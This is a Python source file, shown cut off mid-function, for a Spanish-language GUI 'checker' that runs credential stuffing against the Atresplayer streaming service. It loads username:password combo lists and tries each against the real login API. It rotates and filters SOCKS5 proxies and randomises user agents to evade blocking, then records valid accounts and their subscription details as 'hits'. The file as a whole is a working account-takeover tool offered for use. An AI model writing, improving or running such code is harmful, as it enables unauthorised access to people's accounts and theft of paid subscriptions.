import requests
import os
import sys
import json
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import random
import datetime
import platform
import re
from queue import PriorityQueue
from urllib.parse import urlparse
from colorama import init, Fore, Style
from urllib3.exceptions import InsecureRequestWarning

try:
    import socks
    import requests.adapters
    from requests.packages.urllib3.poolmanager import PoolManager
except ImportError:
    import pip
    pip.main(['install', 'PySocks', 'requests[socks]'])
    import socks
    import requests.adapters
    from requests.packages.urllib3.poolmanager import PoolManager

# CustomTkinter para la GUI
try:
    import customtkinter as ctk
    from tkinter import messagebox, filedialog, scrolledtext
except ImportError:
    import pip
    pip.main(['install', 'customtkinter'])
    import customtkinter as ctk
    from tkinter import messagebox, filedialog, scrolledtext

requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = (
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:"
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:"
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:"
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:"
    "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:"
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:"
    "TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:"
    "TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:"
    "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:"
    "ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
init()

# ---------------- CONFIGURACIÓN GLOBAL ---------------- #
system = platform.system()
if system == "Windows":
    ROOT_DIR = "."
elif system == "Linux":
    if os.path.exists("/sdcard"):
        ROOT_DIR = "/sdcard"
    else:
        ROOT_DIR = os.path.join(".", "sdcard")
else:
    ROOT_DIR = "."

HITS_DIR = os.path.join(ROOT_DIR, "hits")
HITS_COMBO_DIR = os.path.join(ROOT_DIR, "combo")
COMBO_DIR = os.path.join(ROOT_DIR, "combo")
PROXIES_DIR = os.path.join(ROOT_DIR, "proxies")

# Crear directorios si no existen
os.makedirs(HITS_DIR, exist_ok=True)
os.makedirs(HITS_COMBO_DIR, exist_ok=True)
os.makedirs(COMBO_DIR, exist_ok=True)
os.makedirs(PROXIES_DIR, exist_ok=True)

# Crear archivos de hits si no existen
hits_file = os.path.join(HITS_DIR, "A3Player Hits.txt")
combo_file = os.path.join(HITS_COMBO_DIR, "A3Player Combos.txt")
if not os.path.exists(hits_file):
    with open(hits_file, "w", encoding="utf-8") as f:
        f.write("A3PLAYER HITS - REPORTE DE CUENTAS\n")
        f.write("="*50 + "\n\n")
if not os.path.exists(combo_file):
    with open(combo_file, "w", encoding="utf-8") as f:
        f.write("A3PLAYER COMBOS VÁLIDOS\n")
        f.write("="*50 + "\n\n")

login_url = "https://account.atresplayer.com/auth/v1/login"
sub_url = "https://api.atresplayer.com/purchases/v1/subscriptions"

login_headers = {
    "accept": "*/*",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "es-ES,es;q=0.9,tr;q=0.8,en;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://www.atresplayer.com",
    "referer": "https://www.atresplayer.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
}
sub_headers = {
    "accept": "*/*",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "es-ES,es;q=0.9,tr;q=0.8,en;q=0.7",
    "origin": "https://www.atresplayer.com",
    "referer": "https://www.atresplayer.com/",
    "user-agent": login_headers["user-agent"]
}

# Mapas de traducción
planes_map = {
    "862777": "Novelas Nova",
    "1706986": "A3Player Premium",
    "875560": "Premium Internacional"
}
moneda_map = {"USD": "Dólares", "EUR": "Euros"}
periodo_map = {"MONTH": "Mensuales", "YEAR": "Anuales"}
estado_map = {"INACTIVE": "Renovación Cancelada", "ACTIVE": "Renovación Activa"}

USERS_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
]

# Variables globales para estadísticas
class Stats:
    def __init__(self):
        self.total = 0
        self.hits = 0
        self.bad = 0
        self.errors = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
    
    def update(self, result):
        with self.lock:
            self.total += 1
            if result == "HIT":
                self.hits += 1
            elif result == "BAD":
                self.bad += 1
            elif result == "ERROR":
                self.errors += 1
    
    def get_stats(self):
        elapsed = time.time() - self.start_time
        rate = self.total / elapsed if elapsed > 0 else 0
        return {
            'total': self.total,
            'hits': self.hits,
            'bad': self.bad,
            'errors': self.errors,
            'rate': rate,
            'elapsed': elapsed
        }

stats = Stats()

class ProxyManager:
    def __init__(self):
        self.proxy_list = []  # list of original lines
        self.banned_proxies = set()  # set of host:port
        self.current_proxy = None
        self.proxy_type = 'socks5'  # Fixed to socks5 for auth proxies
        self.live_proxies_count = 0
        self.dead_proxies_count = 0
        self.lock = threading.Lock()
        self.proxy_queue = PriorityQueue()
        self.recently_used_proxies = []  # list of host:port
        self.max_recently_used = 10
        self.proxy_performance = {}  # key: host:port, value: time
        self.save_counter = 0
        self.save_interval = 50
        self.real_ip = None

    def get_hostport(self, line):
        parts = line.split(':')
        if len(parts) >= 2:
            return f"{parts[0]}:{parts[1]}"
        return None

    def extract_hostport_from_url(self, proxy_url):
        if '://' in proxy_url:
            after = proxy_url.split('://')[1]
        else:
            after = proxy_url
        if '@' in after:
            return after.split('@')[1]
        return after

    def select_proxy_type(self):
        # Fixed to socks5, but keep for compatibility
        self.proxy_type = 'socks5'
        print(f"{Fore.GREEN}✓ Proxy type set to SOCKS5 (supports auth){Style.RESET_ALL}")

    def get_headers(self, url):
        parsed = urlparse(url)
        is_https = parsed.scheme == 'https'
        host = f"{parsed.hostname}:443" if is_https else parsed.netloc
        headers = {
            "Host": host,
            "User-Agent": random.choice(USERS_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }
        if is_https:
            headers.update({
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Sec-Ch-Ua": '"Chromium";v="118", "Google Chrome";v="118"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"'
            })
        return headers

    def fetch_proxies(self, proxy_file=None):
        all_proxies = []
        if proxy_file:
            try:
                with open(proxy_file, 'r', encoding='utf-8') as file:
                    for line in file:
                        line = line.strip()
                        if line and ':' in line:
                            parts = line.split(':')
                            if len(parts) in [2, 4]:  # host:port or host:port:user:pass
                                all_proxies.append(line)
                print(f"{Fore.GREEN}✓ Loaded {len(all_proxies)} proxies from file{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error reading proxy file: {str(e)[:20]}{Style.RESET_ALL}")
                return False
        else:
            # For online, assume no auth, but since user uses file, skip or adapt
            print(f"{Fore.YELLOW}Online fetch not supported for auth proxies. Use local file.{Style.RESET_ALL}")
            return False
        
        if not all_proxies:
            print(f"{Fore.RED}No proxies obtained{Style.RESET_ALL}")
            return False

        # Try to get real IP with retry
        self.real_ip = None
        for attempt in range(3):
            try:
                response = requests.get("http://httpbin.org/ip", timeout=(5,10))
                self.real_ip = response.json()['origin']
                break
            except:
                if attempt == 2:
                    print(f"{Fore.YELLOW}⚠ Failed to get real IP after 3 attempts. Proceeding without anonymity check.{Style.RESET_ALL}")
                time.sleep(1)
            
        self.proxy_list = self.validate_proxies(all_proxies)
        if not self.proxy_list:
            print(f"{Fore.RED}No live proxies available{Style.RESET_ALL}")
            return False
            
        with self.lock:
            for line in self.proxy_list:
                hostport = self.get_hostport(line)
                pri = self.proxy_performance.get(hostport, 1)
                self.proxy_queue.put((pri, line))
            self.save_proxies()
            
        print(f"{Fore.GREEN}✓ {len(self.proxy_list)} live, {self.dead_proxies_count} dead (SOCKS5){Style.RESET_ALL}")
        return True

    def validate_proxies(self, proxy_lines):
        test_url = "http://httpbin.org/get"
        live_proxies = []
        total_proxies = len(proxy_lines)
        self.live_proxies_count = 0
        self.dead_proxies_count = 0
        update_interval = 100

        def check_proxy(line):
            parts = line.split(':')
            if len(parts) == 2:
                host, port = parts
                user, passw = '', ''
            elif len(parts) == 4:
                host, port, user, passw = parts
            else:
                with self.lock:
                    self.dead_proxies_count += 1
                return

            proxy_url = f"socks5://{user}:{passw}@{host}:{port}" if user and passw else f"socks5://{host}:{port}"
            proxy_dict = {"http": proxy_url, "https": proxy_url}
            hostport = f"{host}:{port}"
            start_time = time.time()
            try:
                response = requests.get(test_url, proxies=proxy_dict, timeout=10, headers=self.get_headers(test_url))
                if response.status_code == 200:
                    if self.real_ip is None:
                        # No anonymity check, just accept if connects
                        with self.lock:
                            self.live_proxies_count += 1
                            live_proxies.append(line)
                            response_time = time.time() - start_time
                            self.proxy_performance[hostport] = response_time
                    else:
                        data = response.json()
                        proxy_ip = data.get("origin", "")
                        headers = data.get("headers", {})
                        anonymity_level = "Elite"

                        if self.real_ip == proxy_ip or self.real_ip in str(headers):
                            anonymity_level = "Transparent"
                        elif 'Via' in headers or 'Proxy-Connection' in headers:
                            anonymity_level = "Anonymous"

                        if anonymity_level != "Transparent":
                            with self.lock:
                                self.live_proxies_count += 1
                                live_proxies.append(line)
                                response_time = time.time() - start_time
                                self.proxy_performance[hostport] = response_time
                        else:
                            with self.lock:
                                self.dead_proxies_count += 1
                else:
                    with self.lock:
                        self.dead_proxies_count += 1
            except:
                with self.lock:
                    self.dead_proxies_count += 1
            finally:
                with self.lock:
                    processed = self.live_proxies_count + self.dead_proxies_count
                    if processed % update_interval == 0 or processed == total_proxies:
                        print('\r' + ' ' * 100 + '\r', end='', flush=True)
                        print(f"{Fore.CYAN}Progress: {processed}/{total_proxies} | Live: {Fore.GREEN}{self.live_proxies_count}{Fore.CYAN} | Dead: {Fore.RED}{self.dead_proxies_count}{Style.RESET_ALL}", end="\r", flush=True)

        max_threads = min(200, len(proxy_lines))
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(check_proxy, proxy_lines)

        print()
        return live_proxies

    def verify_proxies_against_target(self, target_url, timeout=5, verbose=False):
        live_proxies = []
        total_proxies = len(self.proxy_list)
        self.live_proxies_count = 0
        self.dead_proxies_count = 0
        update_interval = 100

        def check_proxy_against_target(line):
            parts = line.split(':')
            if len(parts) == 2:
                host, port = parts
                user, passw = '', ''
            elif len(parts) == 4:
                host, port, user, passw = parts
            else:
                with self.lock:
                    self.dead_proxies_count += 1
                return

            proxy_url = f"socks5://{user}:{passw}@{host}:{port}" if user and passw else f"socks5://{host}:{port}"
            proxy_dict = {"http": proxy_url, "https": proxy_url}
            hostport = f"{host}:{port}"
            start_time = time.time()
            try:
                response = requests.get(target_url, proxies=proxy_dict, timeout=timeout, headers=self.get_headers(target_url), verify=False)
                if response.status_code in (200, 401, 403):
                    with self.lock:
                        self.live_proxies_count += 1
                        live_proxies.append(line)
                        response_time = time.time() - start_time
                        self.proxy_performance[hostport] = response_time
                        if verbose:
                            print(f"{Fore.GREEN}Proxy {hostport} works for {target_url} (Time: {response_time:.2f}s){Style.RESET_ALL}")
                else:
                    with self.lock:
                        self.dead_proxies_count += 1
                        if verbose:
                            print(f"{Fore.RED}Proxy {hostport} failed for {target_url}: Code {response.status_code}{Style.RESET_ALL}")
            except Exception as e:
                with self.lock:
                    self.dead_proxies_count += 1
                    if verbose:
                        print(f"{Fore.RED}Proxy {hostport} failed for {target_url}: {str(e)[:50]}{Style.RESET_ALL}")
            finally:
                with self.lock:
                    processed = self.live_proxies_count + self.dead_proxies_count
                    if processed % update_interval == 0 or processed == total_proxies:
                        print('\r' + ' ' * 100 + '\r', end='', flush=True)
                        print(f"{Fore.CYAN}Progress: {processed}/{total_proxies} | Live: {Fore.GREEN}{self.live_proxies_count}{Fore.CYAN} | Dead: {Fore.RED}{self.dead_proxies_count}{Style.RESET_ALL}", end="\r", flush=True)

        print(f"{Fore.CYAN}Verifying {total_proxies} proxies against {target_url}...{Style.RESET_ALL}")
        with ThreadPoolExecutor(max_workers=min(200, total_proxies)) as executor:
            executor.map(check_proxy_against_target, self.proxy_list)

        print()
        self.proxy_list = live_proxies
        with self.lock:
            self.proxy_queue = PriorityQueue()
            for line in self.proxy_list:
                hostport = self.get_hostport(line)
                priority = self.proxy_performance.get(hostport, 1)
                self.proxy_queue.put((priority, line))
            self.save_proxies()
        print(f"{Fore.GREEN}✓ {len(self.proxy_list)} proxies optimized for {target_url}{Style.RESET_ALL}")

    def save_proxies(self):
        try:
            proxy_file = os.path.join(PROXIES_DIR, f"live_proxies_socks5.txt")
            with open(proxy_file, 'w', encoding='utf-8') as f:
                for line in self.proxy_list:
                    f.write(f"{line}\n")
            print(f"{Fore.GREEN}✓ Saved {len(self.proxy_list)} live proxies to {proxy_file}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error saving proxies: {str(e)[:20]}{Style.RESET_ALL}")

    def get_proxy(self):
        with self.lock:
            if not self.proxy_list:
                self.current_proxy = None
                return None

            # Refill queue if empty
            if self.proxy_queue.empty():
                available = [l for l in self.proxy_list 
                             if self.get_hostport(l) not in self.banned_proxies 
                             and self.get_hostport(l) not in self.recently_used_proxies]
                if not available:
                    available = [l for l in self.proxy_list if self.get_hostport(l) not in self.banned_proxies]
                    self.recently_used_proxies.clear()
                if not available:
                    self.current_proxy = None
                    return None
                for line in available:
                    hostport = self.get_hostport(line)
                    pri = self.proxy_performance.get(hostport, 1)
                    self.proxy_queue.put((pri, line))

            # Get next
            while True:
                if self.proxy_queue.empty():
                    return None
                pri, line = self.proxy_queue.get()
                hostport = self.get_hostport(line)
                if hostport in self.banned_proxies:
                    continue

                # Construct proxy_dict
                parts = line.split(':')
                if len(parts) == 2:
                    host, port = parts
                    user, passw = '', ''
                elif len(parts) == 4:
                    host, port, user, passw = parts
                else:
                    continue  # invalid

                proxy_url = f"socks5://{user}:{passw}@{host}:{port}" if user and passw else f"socks5://{host}:{port}"
                proxy_dict = {"http": proxy_url, "https": proxy_url}

                self.recently_used_proxies.append(hostport)
                if len(self.recently_used_proxies) > self.max_recently_used:
                    self.recently_used_proxies.pop(0)

                self.current_proxy = hostport
                return proxy_dict

    def ban_proxy(self, proxy_dict):
        with self.lock:
            if not proxy_dict:
                return
            hostport = self.extract_hostport_from_url(proxy_dict['http'])
            if hostport in self.banned_proxies:
                return
            self.banned_proxies.add(hostport)

            # Remove from queue
            temp_queue = PriorityQueue()
            while not self.proxy_queue.empty():
                p, line = self.proxy_queue.get()
                if self.get_hostport(line) != hostport:
                    temp_queue.put((p, line))
            self.proxy_queue = temp_queue

            # Remove from list
            self.proxy_list = [l for l in self.proxy_list if self.get_hostport(l) != hostport]

            self.save_counter += 1
            if self.save_counter % self.save_interval == 0:
                self.save_proxies()

    @property
    def live_count(self):
        return len([l for l in self.proxy_list if self.get_hostport(l) not in self.banned_proxies])

    @property
    def banned_count(self):
        return len(self.banned_proxies)

class FileHandler:
    @staticmethod
    def read_users(file_path):
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                return [line.strip() for line in file if ':' in line]
        except Exception as e:
            print(f"{Fore.RED}Error reading file: {str(e)[:20]}{Style.RESET_ALL}")
            return []

    @staticmethod
    def list_files():
        try:
            files = [f for f in os.listdir(COMBO_DIR) if os.path.isfile(os.path.join(COMBO_DIR, f))]
            if not files:
                print(f"{Fore.RED}No combo files found in {COMBO_DIR}{Style.RESET_ALL}")
                return None
            print(f"{Fore.CYAN}┌──[AVAILABLE COMBO FILES]──")
            for i, file in enumerate(files, 1):
                print(f"{Fore.CYAN}│  {i}. {Fore.WHITE}{file}")
            print(f"{Fore.CYAN}└──> ", end="")
            while True:
                try:
                    choice = int(input(f"{Fore.WHITE}"))
                    if 1 <= choice <= len(files):
                        return os.path.join(COMBO_DIR, files[choice - 1])
                    print(f"{Fore.RED}Choose a number between 1 and {len(files)}{Style.RESET_ALL}")
                except ValueError:
                    print(f"{Fore.RED}Enter a valid number{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error accessing {COMBO_DIR}: {str(e)[:20]}{Style.RESET_ALL}")
            return None

def unix_to_date(v):
    # Método actualizado para evitar el warning de deprecación
    return datetime.datetime.fromtimestamp(v / 1000, datetime.timezone.utc).strftime("%d-%m-%Y") if v else "N/A"

# ==================== GUI IMPLEMENTATION ====================

class A3PlayerCheckerGUI:
    def __init__(self):
        # Configuración de la ventana principal
        self.root = ctk.CTk()
        self.root.title("A3Player Checker - Enhanced")
        self.root.geometry("900x700")
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")
        
        # Variables de estado
        self.is_running = False
        self.current_thread = None
        self.proxy_manager = ProxyManager()
        self.combos = []
        self.use_proxies = False
        self.num_threads = 10
        
        # Configurar la interfaz
        self.setup_ui()
        
    def setup_ui(self):
        # Frame principal
        main_frame = ctk.CTkFrame(self.root)
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Título
        title_label = ctk.CTkLabel(
            main_frame, 
            text="A3Player Checker Enhanced",
            font=ctk.CTkFont(size=20, weight="bold")
        )
        title_label.pack(pady=(10, 20))
        
        # Frame de configuración
        config_frame = ctk.CTkFrame(main_frame)
        config_frame.pack(fill="x", padx=10, pady=5)
        
        # Selección de archivo de combos
        file_frame = ctk.CTkFrame(config_frame)
        file_frame.pack(fill="x", padx=10, pady=5)
        
        ctk.CTkLabel(file_frame, text="Archivo de Combos:").pack(anchor="w")
        
        file_subframe = ctk.CTkFrame(file_frame)
        file_subframe.pack(fill="x", pady=5)
        
        self.file_entry = ctk.CTkEntry(file_subframe, placeholder_text="Selecciona un archivo de combos...")
        self.file_entry.pack(side="left", fill="x", expand=True, padx=(0, 5))
        
        ctk.CTkButton(
            file_subframe, 
            text="Buscar", 
            width=80,
            command=self.browse_combo_file
        ).pack(side="right")
        
        # Configuración de hilos
        threads_frame = ctk.CTkFrame(config_frame)
        threads_frame.pack(fill="x", padx=10, pady=5)
        
        ctk.CTkLabel(threads_frame, text="Número de Hilos (1-50):").pack(anchor="w")
        self.threads_entry = ctk.CTkEntry(threads_frame, placeholder_text="10")
        self.threads_entry.pack(fill="x", pady=5)
        self.threads_entry.insert(0, "10")
        
        # Configuración de proxies
        proxy_frame = ctk.CTkFrame(config_frame)
        proxy_frame.pack(fill="x", padx=10, pady=5)
        
        self.use_proxies_var = ctk.BooleanVar()
        ctk.CTkCheckBox(
            proxy_frame, 
            text="Usar Proxies", 
            variable=self.use_proxies_var,
            command=self.toggle_proxy_settings
        ).pack(anchor="w")
        
        self.proxy_subframe = ctk.CTkFrame(proxy_frame)
        
        ctk.CTkLabel(self.proxy_subframe, text="Archivo de Proxies:").pack(anchor="w")
        
        proxy_file_subframe = ctk.CTkFrame(self.proxy_subframe)
        proxy_file_subframe.pack(fill="x", pady=5)
        
        self.proxy_file_entry = ctk.CTkEntry(proxy_file_subframe, placeholder_text="Selecciona un archivo de proxies...")
        self.proxy_file_entry.pack(side="left", fill="x", expand=True, padx=(0, 5))
        
        ctk.CTkButton(
            proxy_file_subframe, 
            text="Buscar", 
            width=80,
            command=self.browse_proxy_file
        ).pack(side="right")
        
        self.optimize_proxies_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(
            self.proxy_subframe, 
            text="Optimizar proxies para el objetivo", 
            variable=self.optimize_proxies_var
        ).pack(anchor="w", pady=5)
        
        # Botones de control
        button_frame = ctk.CTkFrame(main_frame)
        button_frame.pack(fill="x", padx=10, pady=10)
        
        self.start_button = ctk.CTkButton(
            button_frame,
            text="Iniciar Escaneo",
            command=self.start_checking,
            fg_color="green",
            hover_color="dark green"
        )
        self.start_button.pack(side="left", padx=5)
        
        self.stop_button = ctk.CTkButton(
            button_frame,
            text="Detener",
            command=self.stop_checking,
            fg_color="red",
            hover_color="dark red",
            state="disabled"
        )
        self.stop_button.pack(side="left", padx=5)
        
        # Área de estadísticas
        stats_frame = ctk.CTkFrame(main_frame)
        stats_frame.pack(fill="x", padx=10, pady=5)
        
        ctk.CTkLabel(stats_frame, text="Estadísticas en Tiempo Real", font=ctk.CTkFont(weight="bold")).pack(anchor="w", pady=(10, 5))
        
        stats_subframe = ctk.CTkFrame(stats_frame)
        stats_subframe.pack(fill="x", padx=10, pady=5)
        
        # Estadísticas
        self.stats_labels = {}
        stats_data = [
            ("Total", "total"),
            ("Hits", "hits"), 
            ("Bad", "bad"),
            ("Errors", "errors"),
            ("Velocidad", "rate"),
            ("Tiempo", "elapsed")
        ]
        
        for i, (label, key) in enumerate(stats_data):
            frame = ctk.CTkFrame(stats_subframe)
            frame.grid(row=i//3, column=i%3, padx=5, pady=5, sticky="ew")
            
            ctk.CTkLabel(frame, text=label + ":", font=ctk.CTkFont(weight="bold")).pack(anchor="w")
            self.stats_labels[key] = ctk.CTkLabel(frame, text="0")
            self.stats_labels[key].pack(anchor="w")
            
        stats_subframe.columnconfigure((0, 1, 2), weight=1)
        
        # Área de logs
        log_frame = ctk.CTkFrame(main_frame)
        log_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        ctk.CTkLabel(log_frame, text="Logs de Actividad", font=ctk.CTkFont(weight="bold")).pack(anchor="w", pady=(10, 5))
        
        self.log_text = scrolledtext.ScrolledText(
            log_frame,
            wrap="word",
            width=80,
            height=15,
            bg="#2b2b2b",
            fg="white",
            insertbackground="white",
            font=("Consolas", 10)
        )
        self.log_text.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        
        # Configurar colores para los logs
        self.log_text.tag_config("green", foreground="light green")
        self.log_text.tag_config("red", foreground="red")
        self.log_text.tag_config("yellow", foreground="yellow")
        self.log_text.tag_config("cyan", foreground="cyan")
        self.log_text.tag_config("white", foreground="white")
        
        # Inicializar estado de proxies
        self.toggle_proxy_settings()
        
    def toggle_proxy_settings(self):
        if self.use_proxies_var.get():
            self.proxy_subframe.pack(fill="x", padx=10, pady=5)
        else:
            self.proxy_subframe.pack_forget()
            
    def browse_combo_file(self):
        filename = filedialog.askopenfilename(
            title="Seleccionar archivo de combos",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            self.file_entry.delete(0, "end")
            self.file_entry.insert(0, filename)
            
    def browse_proxy_file(self):
        filename = filedialog.askopenfilename(
            title="Seleccionar archivo de proxies",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            self.proxy_file_entry.delete(0, "end")
            self.proxy_file_entry.insert(0, filename)
            
    def log_message(self, message, color="white"):
        """Agrega un mensaje al área de logs con color"""
        self.log_text.insert("end", message + "\n", color)
        self.log_text.see("end")
        self.root.update()
        
    def update_stats(self):
        """Actualiza las estadísticas en la interfaz"""
        stats_data = stats.get_stats()
        
        self.stats_labels['total'].configure(text=str(stats_data['total']))
        self.stats_labels['hits'].configure(text=str(stats_data['hits']))
        self.stats_labels['bad'].configure(text=str(stats_data['bad']))
        self.stats_labels['errors'].configure(text=str(stats_data['errors']))
        self.stats_labels['rate'].configure(text=f"{stats_data['rate']:.2f}/s")
        
        elapsed_str = time.strftime("%H:%M:%S", time.gmtime(stats_data['elapsed']))
        self.stats_labels['elapsed'].configure(text=elapsed_str)
        
    def start_checking(self):
        """Inicia el proceso de checking"""
        # Validar entradas
        combo_file = self.file_entry.get()
        if not combo_file or not os.path.exists(combo_file):
            messagebox.showerror("Error", "Por favor selecciona un archivo de combos válido")
            return
            
        # Leer combos
        self.combos = FileHandler.read_users(combo_file)
        if not self.combos:
            messagebox.showerror("Error", "No se pudieron leer los combos del archivo")
            return
            
        # Configurar hilos
        try:
            self.num_threads = int(self.threads_entry.get())
            if not 1 <= self.num_threads <= 50:
                raise ValueError
        except ValueError:
            messagebox.showerror("Error", "El número de hilos debe estar entre 1 y 50")
            return
            
        # Configurar proxies si se usan
        self.use_proxies = self.use_proxies_var.get()
        if self.use_proxies:
            proxy_file = self.proxy_file_entry.get()
            if not proxy_file or not os.path.exists(proxy_file):
                messagebox.showerror("Error", "Por favor selecciona un archivo de proxies válido")
                return
                
            # Cargar proxies
            self.log_message("Cargando proxies...", "cyan")
            if not self.proxy_manager.fetch_proxies(proxy_file):
                messagebox.showerror("Error", "No se pudieron cargar proxies válidos")
                return
                
            # Optimizar proxies si está marcado
            if self.optimize_proxies_var.get():
                self.log_message("Optimizando proxies para A3Player...", "cyan")
                self.proxy_manager.verify_proxies_against_target(login_url, verbose=False)
                
        # Inicializar estadísticas
        global stats
        stats = Stats()
        
        # Cambiar estado de botones
        self.start_button.configure(state="disabled")
        self.stop_button.configure(state="normal")
        self.is_running = True
        
        # Limpiar logs
        self.log_text.delete(1.0, "end")
        self.log_message("Iniciando escaneo de cuentas A3Player...", "green")
        self.log_message(f"Combos cargados: {len(self.combos)}", "cyan")
        self.log_message(f"Hilos: {self.num_threads}", "cyan")
        self.log_message(f"Usando proxies: {'Sí' if self.use_proxies else 'No'}", "cyan")
        self.log_message("=" * 50, "white")
        
        # Iniciar hilo de checking
        self.current_thread = threading.Thread(target=self.run_checking)
        self.current_thread.daemon = True
        self.current_thread.start()
        
        # Iniciar actualización de estadísticas
        self.update_stats_loop()
        
    def stop_checking(self):
        """Detiene el proceso de checking"""
        self.is_running = False
        self.start_button.configure(state="normal")
        self.stop_button.configure(state="disabled")
        self.log_message("Deteniendo escaneo...", "yellow")
        
    def update_stats_loop(self):
        """Loop para actualizar estadísticas periódicamente"""
        if self.is_running:
            self.update_stats()
            self.root.after(1000, self.update_stats_loop)
            
    def run_checking(self):
        """Ejecuta el proceso de checking en un hilo separado"""
        try:
            with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
                futures = []
                for combo in self.combos:
                    if not self.is_running:
                        break
                    future = executor.submit(self.process_combo_wrapper, combo)
                    futures.append(future)
                    
                # Esperar a que terminen todos los trabajos
                for future in futures:
                    if not self.is_running:
                        break
                    future.result()
                    
        except Exception as e:
            self.log_message(f"Error en el proceso de checking: {str(e)}", "red")
            
        finally:
            self.is_running = False
            self.root.after(0, lambda: self.stop_button.configure(state="disabled"))
            self.root.after(0, lambda: self.start_button.configure(state="normal"))
            self.log_message("=" * 50, "white")
            self.log_message("Escaneo completado!", "green")
            
    def process_combo_wrapper(self, combo):
        """Wrapper para process_combo original con logging en GUI"""
        try:
            USER, PASS = combo.split(":", 1)
        except:
            stats.update("ERROR")
            return False

        session = requests.Session()
        payload = f"username={USER}&password={PASS}"
        headers = login_headers.copy()
        headers["User-Agent"] = random.choice(USERS_AGENTS)

        proxy_selected = self.proxy_manager.get_proxy() if self.use_proxies else None

        try:
            resp = session.post(login_url, data=payload, headers=headers, proxies=proxy_selected, timeout=15, verify=False)
        except Exception as e:
            log_msg = f"⚠ Error conexión: {USER[:20]:<20} Proxy: BANEADO"
            self.root.after(0, lambda: self.log_message(log_msg, "yellow"))
            if self.use_proxies and proxy_selected:
                self.proxy_manager.ban_proxy(proxy_selected)
            stats.update("ERROR")
            return False

        # Check invalid credentials
        if "Invalid credentials" in resp.text or resp.status_code == 401:
            log_msg = f"❌ BAD: {USER[:25]:<25}"
            self.root.after(0, lambda: self.log_message(log_msg, "red"))
            stats.update("BAD")
            return False

        cookies = session.cookies.get_dict()
        if not any("A3PSID" in k for k in cookies.keys()):
            log_msg = f"❌ No Cookie: {USER[:20]:<20}"
            self.root.after(0, lambda: self.log_message(log_msg, "red"))
            stats.update("BAD")
            return False

        # OBTENER INFORMACIÓN DE SUSCRIPCIÓN
        try:
            sub_resp = session.get(sub_url, headers=sub_headers, proxies=proxy_selected, timeout=15, verify=False)
            subscriptions = sub_resp.json()
        except Exception as e:
            subscriptions = []

        # PREPARAR DATOS PARA GUARDAR
        planes_list = []
        line_cuota = []
        fechas_suscrito = []
        ult_pago = []
        prox_pago = []

        if subscriptions:
            for sub in subscriptions:
                plan = planes_map.get(str(sub.get("packageId")), str(sub.get("packageId")))
                planes_list.append(plan)

                price = (sub.get("amount", 0) / 100)
                cur = moneda_map.get(sub.get("currency"), sub.get("currency"))
                period = periodo_map.get(sub.get("periodType"), sub.get("periodType"))
                state = estado_map.get(sub.get("status"), sub.get("status"))

                fecha_sub = unix_to_date(sub.get("subscriptionDate"))
                desde = unix_to_date(sub.get("sinceDate"))
                hasta = unix_to_date(sub.get("untilDate"))

                fechas_suscrito.append(fecha_sub)
                ult_pago.append(desde)
